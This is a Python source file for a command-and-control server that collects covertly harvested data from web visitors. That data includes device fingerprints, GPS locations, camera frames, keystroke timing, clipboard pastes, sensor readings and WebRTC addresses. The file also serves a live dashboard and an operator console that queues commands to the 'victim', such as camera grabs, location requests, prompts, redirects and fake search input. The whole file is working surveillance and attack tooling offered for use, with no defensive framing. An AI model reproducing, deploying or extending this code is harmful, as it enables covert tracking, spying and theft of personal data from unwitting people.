#!/usr/bin/env python3
"""
server.py — c2 + fingerprint collector + dashboard + frame saver + command channel.

routes:
  GET  /                -> health check
  GET  /view            -> live dashboard
  GET  /api/state       -> json snapshot
  GET  /frames/<name>   -> serve a saved frame
  POST /                -> ingest (silent-full, sensors, frame, gps, paste, etc.)
  POST /beacon          -> command channel

writes:
  locations.jsonl
  logs/<ip>.jsonl
  frames/<ts>_<ip>_<n>.jpg
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime, timezone
from pathlib import Path
import base64
import json
import hashlib
import re
import threading
import time
import sys

LOG_DIR = Path("logs")
LOG_DIR.mkdir(exist_ok=True)
MAIN_LOG = Path("locations.jsonl")
FRAME_DIR = Path("frames")
FRAME_DIR.mkdir(exist_ok=True)

SEEN = set()
FINGERPRINTS = {}
SESSIONS = {}
SENSORS = {}
PROBES = {}
KEYSTROKES = {}
PASTES = []
BEACONS = {}
COMMAND_QUEUE = {}
COMMAND_LOG = []
LATEST = {"gps": None, "frame": None, "frame_ts": None, "last_hit": None}
LOCK = threading.Lock()
FRAME_COUNTER = {}
BEACON_QUIET = False  # flip to True if you want to silence per-beacon prints


def now_iso():
    return datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")


DASHBOARD = r"""<!doctype html>
<html><head><meta charset="utf-8"><title>maps · live</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
  *{box-sizing:border-box}
  body{margin:0;font:13px ui-monospace,Menlo,Consolas,monospace;background:#0b0f14;color:#c9d1d9}
  header{padding:14px 18px;border-bottom:1px solid #21262d;display:flex;gap:16px;align-items:center;background:#0d1117;flex-wrap:wrap}
  header h1{margin:0;font-size:15px;color:#e6edf3;font-weight:600}
  header .pill{padding:3px 9px;border-radius:10px;background:#161b22;color:#8b949e;font-size:11px}
  header .pill.live{background:#0d3a1f;color:#3fb950}
  header .pill.warn{background:#3a1f0d;color:#f0883e}
  main{padding:16px;display:grid;grid-template-columns:1fr;gap:16px;max-width:1400px;margin:0 auto}
  @media(min-width:1100px){main{grid-template-columns:1.2fr .8fr}}
  .panel{background:#0d1117;border:1px solid #21262d;border-radius:8px;overflow:hidden}
  .panel h2{margin:0;padding:10px 14px;font-size:12px;color:#8b949e;background:#161b22;border-bottom:1px solid #21262d;font-weight:600;letter-spacing:.5px;text-transform:uppercase}
  .panel .body{padding:12px 14px}
  .fp{border:1px solid #21262d;border-radius:6px;padding:10px 12px;margin-bottom:10px;background:#0d1117}
  .fp .row{display:flex;justify-content:space-between;gap:8px;margin:2px 0;font-size:12px}
  .fp .k{color:#6e7681}
  .fp .v{color:#c9d1d9;text-align:right;max-width:70%;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
  .fp .id{color:#58a6ff;font-weight:600;font-size:12px;margin-bottom:6px;word-break:break-all}
  .fp .id .count{color:#3fb950;font-weight:400}
  .fp details{margin-top:6px}
  .fp summary{cursor:pointer;color:#6e7681;font-size:11px}
  .fp pre{background:#161b22;padding:6px 8px;border-radius:4px;font-size:11px;overflow:auto;max-height:220px;margin-top:6px}
  #map{height:340px;background:#161b22;border-radius:4px;overflow:hidden}
  #frame{max-width:100%;border-radius:4px;border:1px solid #21262d;background:#161b22}
  .meta{display:flex;gap:10px;flex-wrap:wrap;font-size:11px;color:#6e7681;margin-bottom:8px}
  .empty{color:#6e7681;padding:20px 0;text-align:center;font-style:italic}
  .frame-list{display:grid;grid-template-columns:repeat(auto-fill,minmax(80px,1fr));gap:6px;margin-top:8px;max-height:220px;overflow-y:auto}
  .frame-list img{width:100%;border-radius:3px;border:1px solid #21262d;cursor:pointer}
  .cmdline{padding:4px 0;font-size:11px;border-bottom:1px solid #161b22}
  .cmdline .name{color:#79c0ff}
  .cmdline .fp{color:#6e7681}
</style></head>
<body>
<header>
  <h1>maps · live dashboard</h1>
  <span class="pill" id="p-count">0 fingerprints</span>
  <span class="pill" id="p-hits">0 hits</span>
  <span class="pill live" id="p-status">live</span>
</header>
<main>
  <div class="panel"><h2>fingerprints</h2><div class="body" id="fps"><div class="empty">no fingerprints yet</div></div></div>
  <div style="display:flex;flex-direction:column;gap:16px">
    <div class="panel"><h2>latest gps</h2><div class="body">
      <div class="meta" id="gps-meta">no gps yet</div><div id="map">waiting</div>
    </div></div>
    <div class="panel"><h2>latest frame</h2><div class="body">
      <div class="meta" id="frame-meta">no frame yet</div><img id="frame" alt="">
    </div></div>
    <div class="panel"><h2>recent frames</h2><div class="body"><div class="frame-list" id="frames"></div></div></div>
    <div class="panel"><h2>command log</h2><div class="body" id="cmdlog"><div class="empty">no commands yet</div></div></div>
  </div>
</main>
<script>
var mapReady=false, map, marker, pendingGps=null;
function initMap(){
  if(mapReady) return; mapReady=true;
  var s=document.createElement("script");
  s.src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js";
  s.onload=function(){
    var l=document.createElement("link"); l.rel="stylesheet";
    l.href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css";
    document.head.appendChild(l);
    map=L.map("map").setView([20,0],2);
    L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png",{maxZoom:19}).addTo(map);
    if(pendingGps) placeGps(pendingGps);
  };
  document.head.appendChild(s);
}
function placeGps(g){
  if(!mapReady){pendingGps=g; initMap(); return;}
  if(!map){pendingGps=g; return;}
  var ll=[g.lat, g.lon];
  if(!marker) marker=L.marker(ll).addTo(map); else marker.setLatLng(ll);
  map.setView(ll,15);
}
initMap();
function esc(s){ return String(s==null?"":s).replace(/[&<>"']/g, function(c){ return ({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"})[c]; }); }

function fpCard(f){
  var d=f.detail||{};
  var pe = (d.probeErrors||[]).length ? '<div class="row"><span class="k">probe err</span><span class="v">'+esc((d.probeErrors||[]).join(", "))+'</span></div>' : '';
  var ph = f.placeholder ? '<div class="row"><span class="k">note</span><span class="v" style="color:#f0883e">beacon-only (silent-full pending)</span></div>' : '';
  return '<div class="fp">' +
    '<div class="id">'+f.id_short+'... <span class="count">x'+f.count+'</span></div>' +
    ph +
    '<div class="row"><span class="k">ip</span><span class="v">'+esc(f.ip)+'</span></div>' +
    '<div class="row"><span class="k">ua</span><span class="v">'+esc(f.ua)+'</span></div>' +
    '<div class="row"><span class="k">app</span><span class="v">'+(f.app?esc(f.app)+" (in-app)":"&lt;browser&gt;")+'</span></div>' +
    '<div class="row"><span class="k">browser</span><span class="v">'+esc(f.browser||"")+' - '+esc(f.os||"")+'</span></div>' +
    '<div class="row"><span class="k">platform</span><span class="v">'+esc(f.platform||"")+' cores='+(f.cores||"?")+' mem='+(f.memory||"?")+'GB</span></div>' +
    '<div class="row"><span class="k">screen</span><span class="v">'+(f.screen_w||"?")+'x'+(f.screen_h||"?")+' dpr='+(f.dpr||"?")+'</span></div>' +
    '<div class="row"><span class="k">gpu</span><span class="v">'+esc(f.gpu||"")+'</span></div>' +
    '<div class="row"><span class="k">webgpu</span><span class="v">'+esc(f.webgpu||"-")+'</span></div>' +
    '<div class="row"><span class="k">tz / lang</span><span class="v">'+esc(f.tz||"")+' - '+esc((f.langs||[]).join(","))+'</span></div>' +
    '<div class="row"><span class="k">fonts</span><span class="v">'+(f.fonts_n||0)+' detected</span></div>' +
    '<div class="row"><span class="k">webrtc pub</span><span class="v">'+esc((f.webrtc_public||[]).join(","))+'</span></div>' +
    '<div class="row"><span class="k">battery</span><span class="v">'+(f.battery?Math.round((f.battery.level||0)*100)+"% "+(f.battery.charging?"charging":"discharging"):"-")+'</span></div>' +
    '<div class="row"><span class="k">motion state</span><span class="v">'+esc(f.motion_state||"-")+'</span></div>' +
    '<div class="row"><span class="k">keystrokes</span><span class="v">'+(f.keystroke_count||0)+' median='+(f.keystroke_median||0)+'ms</span></div>' +
    '<div class="row"><span class="k">beacon</span><span class="v">'+esc(f.beacon_age||"-")+'</span></div>' +
    '<div class="row"><span class="k">queued</span><span class="v">'+(f.queued||0)+'</span></div>' +
    '<div class="row"><span class="k">last seen</span><span class="v">'+esc(f.last_seen)+'</span></div>' +
    pe +
    '<details><summary>raw detail</summary><pre>'+esc(JSON.stringify(d,null,2))+'</pre></details>' +
    '</div>';
}

function tick(){
  fetch("/api/state", {cache:"no-store"}).then(function(r){ return r.json(); }).then(function(s){
    document.getElementById("p-count").textContent=s.fingerprints.length+" fingerprints";
    document.getElementById("p-hits").textContent=s.total_hits+" hits";
    document.getElementById("p-status").textContent="live";
    document.getElementById("p-status").className="pill live";
    var fps=document.getElementById("fps");
    if(s.fingerprints.length){
      var out="";
      for(var i=0;i<s.fingerprints.length;i++) out+=fpCard(s.fingerprints[i]);
      fps.innerHTML=out;
    } else {
      fps.innerHTML='<div class="empty">no fingerprints yet</div>';
    }
    if(s.latest_gps){
      var g=s.latest_gps;
      document.getElementById("gps-meta").textContent=g.lat.toFixed(6)+", "+g.lon.toFixed(6)+"  acc="+(g.accuracy||"?")+"m  @ "+g.ts;
      placeGps(g);
    }
    if(s.latest_frame){
      document.getElementById("frame").src=s.latest_frame;
      document.getElementById("frame-meta").textContent=s.latest_frame_ts||"";
    }
    if(s.frames && s.frames.length){
      var out2="";
      for(var j=0;j<s.frames.length;j++) out2+='<img src="'+s.frames[j]+'" onclick="window.open(\''+s.frames[j]+'\',\'_blank\')">';
      document.getElementById("frames").innerHTML=out2;
    }
    if(s.cmd_log && s.cmd_log.length){
      var out3="";
      var lo = Math.max(0, s.cmd_log.length-30);
      for(var k=s.cmd_log.length-1;k>=lo;k--){
        var c=s.cmd_log[k];
        var res=c.error?"err: "+esc(c.error):(c.result?esc(JSON.stringify(c.result).slice(0,120)):"queued");
        out3+='<div class="cmdline"><span class="name">'+esc(c.name)+'</span> <span class="fp">'+esc((c.fp||"").slice(0,8))+'</span> -> '+res+'</div>';
      }
      document.getElementById("cmdlog").innerHTML=out3;
    }
  }).catch(function(){
    document.getElementById("p-status").textContent="disconnected";
    document.getElementById("p-status").className="pill warn";
  });
}
setInterval(tick,1500);
tick();
</script>
</body></html>
"""


class Handler(BaseHTTPRequestHandler):

    def get_client_ip(self):
        cf = self.headers.get("CF-Connecting-IP")
        if cf:
            return cf.strip()
        xff = self.headers.get("X-Forwarded-For")
        if xff:
            return xff.split(",")[0].strip()
        xr = self.headers.get("X-Real-IP")
        if xr:
            return xr.strip()
        return self.client_address[0]

    def _send(self, code, body, ctype="application/json"):
        if isinstance(body, (dict, list)):
            body = json.dumps(body).encode()
        elif isinstance(body, str):
            body = body.encode()
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_OPTIONS(self):
        self._send(204, b"")

    def do_GET(self):
        if self.path == "/":
            return self._send(200, {"status": "running", "time": now_iso()})
        if self.path == "/view":
            return self._send(200, DASHBOARD, ctype="text/html; charset=utf-8")
        if self.path.startswith("/frames/"):
            name = self.path.split("/frames/", 1)[1]
            safe = "".join(c for c in name if c.isalnum() or c in "._-")
            f = FRAME_DIR / safe
            if f.exists() and f.is_file():
                ext = f.suffix.lower()
                ctype = "image/jpeg" if ext in (".jpg", ".jpeg") else "image/png"
                return self._send(200, f.read_bytes(), ctype=ctype)
            return self._send(404, {"err": "not found"})
        if self.path == "/api/state":
            with LOCK:
                fps = []
                now = time.time()
                for fid, info in sorted(FINGERPRINTS.items(), key=lambda kv: kv[1].get("last_seen", ""), reverse=True):
                    scr = info.get("screen") or {}
                    wg = info.get("webgpu") or {}
                    sensor = SENSORS.get(fid) or {}
                    ks = KEYSTROKES.get(fid) or {}
                    beacon_ts = BEACONS.get(fid)
                    beacon_age = "{}s ago".format(int(now - beacon_ts)) if beacon_ts else "-"
                    fps.append({
                        "id_short": fid[:16],
                        "count": info.get("count", 0),
                        "ip": info.get("ip"),
                        "ua": info.get("ua"),
                        "platform": info.get("platform"),
                        "cores": info.get("cores"),
                        "memory": info.get("memory"),
                        "screen_w": scr.get("width"),
                        "screen_h": scr.get("height"),
                        "dpr": scr.get("dpr"),
                        "gpu": info.get("gpu"),
                        "webgpu": (wg.get("architecture") or "") + " / " + (wg.get("device") or ""),
                        "tz": info.get("tz"),
                        "langs": info.get("langs"),
                        "fonts_n": info.get("fonts_n"),
                        "webrtc_local": info.get("webrtc_local"),
                        "webrtc_public": info.get("webrtc_public"),
                        "battery": info.get("battery"),
                        "incognito": info.get("incognito"),
                        "app": info.get("app"),
                        "browser": info.get("browser"),
                        "os": info.get("os"),
                        "motion_state": sensor.get("motionState"),
                        "keystroke_count": ks.get("count", 0),
                        "keystroke_median": ks.get("median", 0),
                        "beacon_age": beacon_age,
                        "queued": len(COMMAND_QUEUE.get(fid, [])),
                        "placeholder": info.get("placeholder", False),
                        "last_seen": info.get("last_seen"),
                        "detail": {
                            "appContext": info.get("appContext"),
                            "webgpu": wg,
                            "sensors": sensor,
                            "network_probe": PROBES.get(fid),
                            "keystroke_profile": ks,
                            "hardware": info.get("hardware"),
                            "clipboard": info.get("clipboard"),
                            "permissions": info.get("permissions"),
                            "math": info.get("math"),
                            "probeErrors": info.get("probeErrors"),
                        },
                    })
                recent = sorted(FRAME_DIR.glob("*.*"), key=lambda p: p.stat().st_mtime, reverse=True)[:24]
                frame_urls = ["/frames/" + p.name for p in recent]
                cmd_log = COMMAND_LOG[-50:]
                payload = {
                    "fingerprints": fps,
                    "total_hits": sum(f["count"] for f in fps),
                    "latest_gps": LATEST.get("gps"),
                    "latest_frame": LATEST.get("frame"),
                    "latest_frame_ts": LATEST.get("frame_ts"),
                    "frames": frame_urls,
                    "cmd_log": [{"name": c[2], "fp": c[1], "result": c[4], "error": c[5]} for c in cmd_log],
                }
            return self._send(200, payload)
        return self._send(404, {"err": "no route"})

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0) or 0)
        raw = self.rfile.read(length) if length else b"{}"
        try:
            data = json.loads(raw.decode("utf-8"))
        except Exception:
            data = {"raw": raw.decode("utf-8", errors="replace")}

        if self.path == "/beacon":
            return self._handle_beacon(data)

        client_ip = self.get_client_ip()
        received_at = now_iso()
        t = data.get("type", "unknown")

        content_hash = hashlib.md5(json.dumps(data, sort_keys=True).encode()).hexdigest()
        with LOCK:
            if content_hash in SEEN:
                return self._send(200, {"ok": True, "duplicate": True})
            SEEN.add(content_hash)

            sess = SESSIONS.setdefault(client_ip, {"first": received_at, "last": received_at, "hits": 0, "types": {}})
            sess["last"] = received_at
            sess["hits"] += 1
            sess["types"][t] = sess["types"].get(t, 0) + 1

            entry = {"received_at": received_at, "client_ip": client_ip, "data": data}
            with MAIN_LOG.open("a", encoding="utf-8") as f:
                f.write(json.dumps(entry) + "\n")
            safe_ip = client_ip.replace(":", "_")
            with (LOG_DIR / "{}.jsonl".format(safe_ip)).open("a", encoding="utf-8") as f:
                f.write(json.dumps(entry) + "\n")

            if t == "silent-full":
                fp_id = data.get("fingerprintId") or "?"
                prev = FINGERPRINTS.get(fp_id, {}).get("count", 0)
                app_ctx = data.get("appContext") or {}
                wg = data.get("webgpu") or {}
                FINGERPRINTS[fp_id] = {
                    "last_seen": received_at,
                    "count": prev + 1,
                    "ip": client_ip,
                    "ua": (data.get("userAgent") or "")[:120],
                    "platform": data.get("platform", ""),
                    "screen": data.get("screen", {}),
                    "gpu": (data.get("webgl") or {}).get("unmaskedRenderer") or (data.get("webgl") or {}).get("renderer", ""),
                    "webgpu": wg,
                    "cores": data.get("hardwareConcurrency"),
                    "memory": data.get("deviceMemory"),
                    "tz": data.get("timezone", ""),
                    "langs": data.get("languages", []),
                    "fonts_n": len(data.get("fontsDetected") or []),
                    "webrtc_public": (data.get("webrtc") or {}).get("public", []),
                    "webrtc_local": (data.get("webrtc") or {}).get("local", []),
                    "incognito": (data.get("incognito") or {}).get("likelyIncognito"),
                    "battery": data.get("battery"),
                    "hardware": data.get("hardware"),
                    "clipboard": data.get("clipboard"),
                    "permissions": data.get("permissions"),
                    "math": data.get("math"),
                    "probeErrors": data.get("probeErrors"),
                    "appContext": app_ctx,
                    "app": app_ctx.get("app"),
                    "is_inapp": app_ctx.get("isInApp"),
                    "is_webview": app_ctx.get("isAndroidWebview"),
                    "browser": app_ctx.get("browser"),
                    "browser_version": app_ctx.get("browserVersion"),
                    "os": app_ctx.get("os"),
                    "fp_id": fp_id,
                    "placeholder": False,
                }

            elif t == "sensors":
                fp_id = data.get("fingerprintId") or next(iter(FINGERPRINTS.keys()), None)
                if fp_id:
                    SENSORS[fp_id] = data.get("sensors") or {}

            elif t == "network-probe":
                fp_id = data.get("fingerprintId") or next(iter(FINGERPRINTS.keys()), None)
                if fp_id:
                    PROBES[fp_id] = data.get("probe") or {}

            elif t == "keystroke-profile":
                fp_id = data.get("fingerprintId") or next(iter(FINGERPRINTS.keys()), None)
                if fp_id:
                    KEYSTROKES[fp_id] = data

            elif t == "paste-event":
                PASTES.append({"ts": received_at, "ip": client_ip, "data": data})
                if len(PASTES) > 200:
                    PASTES.pop(0)

            elif t in ("gps", "gps-live"):
                LATEST["gps"] = {
                    "lat": data.get("lat"),
                    "lon": data.get("lon"),
                    "accuracy": data.get("accuracy"),
                    "speed": data.get("speed"),
                    "ts": received_at,
                }

            elif t == "frame":
                img = data.get("image") or ""
                if img.startswith("data:image"):
                    LATEST["frame"] = img
                    LATEST["frame_ts"] = received_at
                    try:
                        header, _, b64 = img.partition(",")
                        mime = re.search(r"data:(image/\w+)", header)
                        ext = "jpg" if (mime and "jpeg" in mime.group(1)) else "png"
                        ctr = FRAME_COUNTER.get(client_ip, 0) + 1
                        FRAME_COUNTER[client_ip] = ctr
                        fname = FRAME_DIR / "{}_{}_{:04d}.{}".format(
                            time.strftime("%Y%m%d_%H%M%S"), safe_ip, ctr, ext)
                        fname.write_bytes(base64.b64decode(b64))
                        print("[+] frame saved -> {}".format(fname))
                    except Exception as e:
                        print("[!] frame save error: {}".format(e))

            LATEST["last_hit"] = {"type": t, "ip": client_ip, "ts": received_at}

        self._log_to_console(t, data, client_ip, received_at)
        return self._send(200, {"ok": True})

    def _handle_beacon(self, data):
        t = data.get("type")
        fp = data.get("fp")
        client_ip = self.get_client_ip()
        server_time = now_iso()

        if t == "beacon":
            with LOCK:
                if fp and fp not in FINGERPRINTS:
                    FINGERPRINTS[fp] = {
                        "last_seen": server_time,
                        "count": 1,
                        "ip": client_ip,
                        "ua": "(beacon-only - silent-full not received yet)",
                        "platform": "", "screen": {}, "gpu": "", "webgpu": {},
                        "cores": None, "memory": None, "tz": "", "langs": [],
                        "fonts_n": 0, "webrtc_public": [], "webrtc_local": [],
                        "incognito": None, "battery": None, "hardware": {},
                        "clipboard": None, "permissions": {}, "math": {},
                        "probeErrors": None, "appContext": {}, "app": None,
                        "is_inapp": False, "is_webview": False,
                        "browser": "", "browser_version": "", "os": "",
                        "fp_id": fp, "placeholder": True,
                    }
                    print("[+] registered via beacon: {}...  ip={}".format(fp[:16], client_ip))
                BEACONS[fp] = time.time()
                cmd = None
                if fp in COMMAND_QUEUE and COMMAND_QUEUE[fp]:
                    cmd = COMMAND_QUEUE[fp].pop(0)

            if cmd:
                print("[>] dispatch to {}...: {} {}".format(fp[:8], cmd["name"], cmd.get("args")))
            elif not BEACON_QUIET:
                queued = len(COMMAND_QUEUE.get(fp, []))
                print("[.] beacon  {}...  ip={}  queued={}  t={}".format(
                    (fp or "?")[:8], client_ip, queued, server_time))
            return self._send(200, {"cmd": cmd, "server_time": server_time})

        if t == "cmd-result":
            with LOCK:
                COMMAND_LOG.append((
                    server_time, fp, data.get("cmd"), data.get("args"),
                    data.get("result"), data.get("error"),
                ))
            print("[<] result from {}...: {} -> {} err={}".format(
                (fp or "?")[:8], data.get("cmd"), data.get("result"), data.get("error")))
            return self._send(200, {"ok": True})

        return self._send(200, {"ok": False})

    def _log_to_console(self, t, data, ip, ts):
        if t == "paste-event":
            print("\n" + "=" * 52)
            print("PASTE    | {}".format(ts))
            print("IP       | {}".format(ip))
            print("FP       | {}...".format((data.get("fingerprintId") or "?")[:16]))
            print("Len      | {}".format(data.get("length")))
            print("Content  | {}".format(repr((data.get("content") or "")[:200])))
            print("=" * 52)
            return

        print("\n" + "=" * 52)
        print("NEW HIT  | {}".format(ts))
        print("IP       | {}".format(ip))
        print("Type     | {}".format(t))

        if t in ("gps", "gps-live"):
            print("GPS      | {}, {}  acc={}".format(data.get("lat"), data.get("lon"), data.get("accuracy")))
        elif t == "frame":
            img = data.get("image") or ""
            print("Camera   | frame received ({} b64 chars) facing={}".format(len(img), data.get("facing")))
        elif t == "silent-full":
            fp_id = data.get("fingerprintId") or "?"
            info = FINGERPRINTS.get(fp_id, {})
            print("FP       | {}...  x{}".format(fp_id[:16], info.get("count", 1)))
            pe = data.get("probeErrors") or []
            if pe:
                print("Probes!! | {} failed: {}".format(len(pe), ", ".join(pe[:6])))
            print("Device   | {}".format((info.get("ua") or "")[:70]))
            print("Platform | {}  cores={}  mem={}GB".format(
                info.get("platform"), info.get("cores"), info.get("memory")))
            scr = info.get("screen") or {}
            print("Screen   | {}x{}  dpr={}".format(scr.get("width"), scr.get("height"), scr.get("dpr")))
            print("GPU      | {}".format((info.get("gpu") or "")[:70]))
            wg = info.get("webgpu") or {}
            print("WebGPU   | {} / {}".format(wg.get("architecture"), wg.get("device")))
            print("TZ/Lang  | {}  {}".format(info.get("tz"), info.get("langs")))
            print("Fonts    | {} detected".format(info.get("fonts_n")))
            app = info.get("app")
            if app:
                print("App      | {}  (in-app browser)".format(app))
            elif info.get("is_webview"):
                print("App      | <webview>")
            else:
                print("App      | <browser>")
            print("Browser  | {} {}  -  {}".format(
                info.get("browser"), info.get("browser_version"), info.get("os")))
        elif t == "sensors":
            s = data.get("sensors") or {}
            o = s.get("orientation") or {}
            m = s.get("motion") or {}
            print("Orientation| events={} alpha={} beta={} gamma={}".format(
                o.get("events"), o.get("alpha"), o.get("beta"), o.get("gamma")))
            print("Motion     | events={} interval={} state={}".format(
                m.get("events"), m.get("interval"), s.get("motionState")))
            am = s.get("ambient") or {}
            print("Ambient    | supported={} lux={}".format(am.get("supported"), am.get("last")))
        elif t == "network-probe":
            p = data.get("probe") or {}
            for k, v in p.items():
                print("Probe    | {} {:28} rtt={}ms".format("OK" if v.get("ok") else "X", k, v.get("rtt")))
        elif t == "keystroke-profile":
            print("Keys     | n={} mean={}ms median={}ms std={}ms".format(
                data.get("count"), data.get("mean"), data.get("median"), data.get("std")))
        elif t == "voices-update":
            print("Voices   | {} tts voices".format(len(data.get("voices") or [])))
        elif t == "camera-error":
            print("CamErr   | {}".format(data.get("msg")))
        elif t == "gps-error":
            print("GpsErr   | code={}  {}".format(data.get("code"), data.get("msg")))
        else:
            print("Data     | {}".format(str(data)[:140]))

        print("=" * 52)

    def log_message(self, *args):
        pass


HELP = """
commands:
  fps                      list fingerprints
  use <fp_id>              select a fingerprint (short id ok)
  queue                    show pending commands for current fp
  msg "title" | "body"     popup message with title + body
  msg "text"               popup message (title = "Message")
  alert "text"             native alert() dialog
  prompt "question"        ask victim a question, capture the answer
  redirect "url"           navigate victim to url
  title "text"             change tab title
  vibrate                  vibrate the phone
  flash                    flash a white overlay
  grab [count] [ms]        capture count frames at ms interval (default 15 @ 1000ms)
  flip                     switch camera user <-> environment
  locate [n]               request location n times
  sensors [sec]            sample sensors for sec seconds
  search "text"            type into the fake search box
  ping                     test the channel
  clear                    clear command log
  help                     show this
  quit                     exit
"""


def console_loop():
    cur = None
    print(HELP)
    while True:
        try:
            line = sys.stdin.readline()
        except Exception:
            return
        if not line:
            return
        line = line.strip()
        if not line:
            continue

        parts = line.split(None, 1)
        verb = parts[0].lower()
        rest = parts[1] if len(parts) > 1 else ""

        if verb in ("quit", "exit"):
            sys.exit(0)

        if verb == "help":
            print(HELP)
            continue

        if verb == "fps":
            with LOCK:
                if not FINGERPRINTS:
                    print("[!] no fingerprints yet - waiting for beacon or silent-full")
                for fid, info in FINGERPRINTS.items():
                    q = len(COMMAND_QUEUE.get(fid, []))
                    ph = " [beacon-only]" if info.get("placeholder") else ""
                    print("  {}...  ip={}  ua={}  queued={}{}".format(
                        fid[:16], info.get("ip"), (info.get("ua") or "")[:50], q, ph))
            continue

        if verb == "use":
            target = rest.strip()
            with LOCK:
                matches = [k for k in FINGERPRINTS if k.startswith(target)]
            if not matches:
                print("[!] no fp matches {}".format(target))
                continue
            if len(matches) > 1:
                print("[!] ambiguous: {}".format([m[:12] for m in matches]))
                continue
            cur = matches[0]
            print("[*] current -> {}...".format(cur[:16]))
            continue

        if verb == "queue":
            if not cur:
                print("[!] pick a session with 'use'")
                continue
            with LOCK:
                q = COMMAND_QUEUE.get(cur, [])
            for i, c in enumerate(q):
                print("  {}: {} {}".format(i, c["name"], c.get("args")))
            if not q:
                print("  (empty)")
            continue

        if verb == "clear":
            with LOCK:
                COMMAND_LOG.clear()
            print("[*] command log cleared")
            continue

        if not cur:
            print("[!] pick a session first with 'use <fp_id>'")
            continue

        def parse_text():
            r = rest.strip()
            if r.startswith('"') and r.endswith('"') and len(r) >= 2:
                return r[1:-1]
            return r

        cmd = None
        if verb == "msg":
            r = rest.strip()
            if "|" in r:
                a, b = r.split("|", 1)
                title = a.strip().strip('"')
                body = b.strip().strip('"')
            else:
                title = "Message"
                body = parse_text()
            cmd = {"name": "msg", "args": {"title": title, "body": body}}
        elif verb == "alert":
            cmd = {"name": "alert", "args": {"body": parse_text()}}
        elif verb == "prompt":
            cmd = {"name": "prompt", "args": {"body": parse_text()}}
        elif verb == "redirect":
            cmd = {"name": "redirect", "args": {"url": parse_text()}}
        elif verb == "title":
            cmd = {"name": "title", "args": {"text": parse_text()}}
        elif verb == "vibrate":
            cmd = {"name": "vibrate", "args": {}}
        elif verb == "flash":
            cmd = {"name": "flash", "args": {}}
        elif verb == "grab":
            bits = rest.split()
            count = int(bits[0]) if len(bits) > 0 and bits[0].isdigit() else 15
            ms = int(bits[1]) if len(bits) > 1 and bits[1].isdigit() else 1000
            cmd = {"name": "grab", "args": {"count": count, "interval_ms": ms}}
        elif verb == "flip":
            cmd = {"name": "flip", "args": {}}
        elif verb == "locate":
            n = int(rest) if rest.strip().isdigit() else 3
            cmd = {"name": "locate", "args": {"count": n}}
        elif verb == "sensors":
            s = int(rest) if rest.strip().isdigit() else 20
            cmd = {"name": "sensors", "args": {"seconds": s}}
        elif verb == "search":
            cmd = {"name": "search", "args": {"text": parse_text()}}
        elif verb == "ping":
            cmd = {"name": "ping", "args": {}}
        else:
            print("[?] unknown command: {}  (try 'help')".format(verb))
            continue

        with LOCK:
            COMMAND_QUEUE.setdefault(cur, []).append(cmd)
        print("[*] queued on {}...: {} {}".format(cur[:16], verb, cmd.get("args")))
        print("    will dispatch on next beacon (within 8s if tab is open)")


def main():
    print("listening on http://0.0.0.0:8080")
    print("dashboard  -> http://localhost:8080/view")
    print("logs       -> {}".format(MAIN_LOG.resolve()))
    print("frames     -> {}".format(FRAME_DIR.resolve()))
    print("-" * 52)
    threading.Thread(target=console_loop, daemon=True).start()
    HTTPServer(("0.0.0.0", 8080), Handler).serve_forever()


if __name__ == "__main__":
    main()